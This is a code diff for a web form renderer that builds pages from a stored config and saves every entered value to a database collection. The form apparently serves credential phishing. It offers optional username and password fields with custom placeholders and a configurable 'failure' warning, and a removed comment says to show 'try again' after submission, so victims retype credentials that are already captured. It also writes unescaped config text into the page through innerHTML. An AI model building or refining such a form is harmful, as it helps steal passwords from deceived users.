@@ -21,7 +21,7 @@ body{
   box-shadow:0 0 10px rgba(0,0,0,0.1);
 }
 
-/* BUILDER STYLE MEDIA */
+/* BUILDER MEDIA */
 .builder-media{
   text-align:center;
   margin-bottom:12px;
@@ -146,7 +146,7 @@ db.collection("forms").doc(formId).get().then(doc=>{
   renderForm();
 });
 
-/* RENDER EXACTLY LIKE BUILDER */
+/* RENDER BUILDER-ACCURATE (NO EXTRA INPUTS) */
 function renderForm(){
   $("formTitle").innerText = formConfig.title || "";
   $("formTitle").style.color = formConfig.titleColor || "#000";
@@ -157,6 +157,7 @@ function renderForm(){
   imageContainer.innerHTML = "";
   formEl.innerHTML = "";
   embedEl.innerHTML = "";
+  failureWarning.innerText = "";
 
   /* MEDIA */
   if(formConfig.avatarURL){
@@ -167,41 +168,53 @@ function renderForm(){
   }
 
   /* WARNING */
-  if(formConfig.enableWarning){
-    failureWarning.innerText = formConfig.warning || "";
+  if(formConfig.enableWarning && formConfig.warning){
+    failureWarning.innerText = formConfig.warning;
   }
 
-  /* AUTH FIELDS */
-  if(formConfig.addAuth){
-    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>`;
-    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
+  /* AUTH FIELDS — ONLY IF PLACEHOLDERS EXIST */
+  if(
+    formConfig.addAuth &&
+    formConfig.usernamePlaceholder &&
+    formConfig.passwordPlaceholder
+  ){
+    formEl.innerHTML += `
+      <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
+      <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>
+    `;
   }
 
-  /* EXTRA FIELDS */
-  (formConfig.extraFields || []).forEach(f=>{
-    formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
-  });
+  /* EXTRA FIELDS — FILTER EMPTY */
+  if(Array.isArray(formConfig.extraFields)){
+    formConfig.extraFields
+      .filter(f => typeof f === "string" && f.trim() !== "")
+      .forEach(f=>{
+        formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
+      });
+  }
 
   /* MAIN BUTTON */
-  if(formConfig.showMainBtn){
+  if(formConfig.showMainBtn && formConfig.buttonText){
     const btn = document.createElement("button");
-    btn.textContent = formConfig.buttonText || "Submit";
+    btn.textContent = formConfig.buttonText;
     btn.style.background = formConfig.btnColor || "#1976d2";
     btn.onclick = submitForm;
     formEl.appendChild(btn);
   }
 
   /* EMBED LINKS */
-  (formConfig.embedLinks || []).forEach(l=>{
-    if(!l.show) return;
-    embedEl.innerHTML += `
-      <div class="embedLink">
-        <strong>${l.text}</strong><br>
-        <a href="${l.url}" target="_blank">${l.url}</a>
-        ${l.desc ? `<br><small>${l.desc}</small>` : ""}
-      </div>
-    `;
-  });
+  if(Array.isArray(formConfig.embedLinks)){
+    formConfig.embedLinks.forEach(l=>{
+      if(!l || !l.show || !l.url) return;
+      embedEl.innerHTML += `
+        <div class="embedLink">
+          <strong>${l.text || ""}</strong><br>
+          <a href="${l.url}" target="_blank">${l.url}</a>
+          ${l.desc ? `<br><small>${l.desc}</small>` : ""}
+        </div>
+      `;
+    });
+  }
 }
 
 /* SUBMIT */
@@ -210,7 +223,9 @@ function submitForm(e){
 
   const data = {};
   formEl.querySelectorAll("input,textarea").forEach(i=>{
-    data[i.name] = i.value;
+    if(i.value.trim() !== ""){
+      data[i.name] = i.value;
+    }
   });
 
   db.collection("submissions").add({
@@ -219,9 +234,8 @@ function submitForm(e){
     createdAt: new Date().toISOString()
   });
 
-  /* SHOW TRY AGAIN UNDER WARNING */
   submitResult.style.opacity = 1;
-  setTimeout(()=>submitResult.style.opacity = 0,3000);
+  setTimeout(()=>submitResult.style.opacity = 0, 3000);
 
   formEl.reset();
 }
